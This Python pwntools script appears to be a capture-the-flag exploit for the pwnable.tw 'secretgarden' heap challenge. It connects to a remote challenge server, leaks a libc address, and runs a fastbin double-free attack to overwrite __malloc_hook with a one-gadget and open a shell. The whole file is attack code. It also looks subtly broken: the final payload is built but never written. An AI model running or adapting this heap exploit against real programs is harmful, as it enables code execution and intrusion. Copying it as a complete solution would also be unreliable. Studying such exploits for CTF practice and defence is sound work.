#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
if sys.argv[1] == "l":
    context.log_level = "debug"
    #  io = process("./secretgarden", env = {"LD_PRELOAD": "./libc_64.so.6"})
    io = process("./secretgarden.bak")
    libc = io.libc
    main_arena = 0x399b00
    oneGadgetOffset = 0x3f2d6
    #  oneGadgetOffset = 0x3f32a
    #  oneGadgetOffset = 0xd691f

else:
    io = remote("chall.pwnable.tw", 10203)
    libc = ELF("./libc_64.so.6")
    main_arena =  0x3c3b20
    oneGadgetOffset = 0x45216
    #  oneGadgetOffset = 0x4526a
    #  oneGadgetOffset = 0xef6c4
    #  oneGadgetOffset = 0xf0567


def DEBUG():
	raw_input("DEBUG: ")
        gdb.attach(io)

def Raise(length, name, color):
    io.sendlineafter(" : ", "1")
    io.sendlineafter(" :", str(length))
    io.sendafter(" :", name)
    io.sendlineafter(" :", color)

def Visit():
    io.sendlineafter(" : ", "2")

def Remove(idx):
    io.sendlineafter(" : ", "3")
    io.sendlineafter(":", str(idx))

def Clean():
    io.sendlineafter(" : ", "4")

if __name__ == "__main__":
    success("Step 1: Leak libc.address")
    Raise(160, '0' * 160, '0000') # 0
    Raise(160, '1' * 160, '1111') # 1
    Remove(0)
    #  DEBUG()
    Raise(16, 'xxxxxxxx', '2222') # 2
    Visit()
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - 88 - main_arena
    success("libc.address -> {:#x}".format(libc.address))
    oneGadget = libc.address + oneGadgetOffset
    pause()

    success("Step 2: fastbin attack")
    #  DEBUG()
    fakeChunk = libc.sym['__malloc_hook'] - 0x23 # size = 0x7f
    Raise(0x60, '3' * 0x60, '3333')
    Raise(0x60, '4' * 0x60, '4444')
    Remove(3)
    Remove(4)
    Remove(3)
    Raise(0x60, p64(fakeChunk), '5555')
    Raise(0x60, '6' * 0x60, '6666')
    Raise(0x60, '7' * 0x60, '7777')
    payload = cyclic(0x13) + p64(oneGadget)
    
    DEBUG()
    Remove(0)
    Remove(0)

    io.interactive()
    io.close()

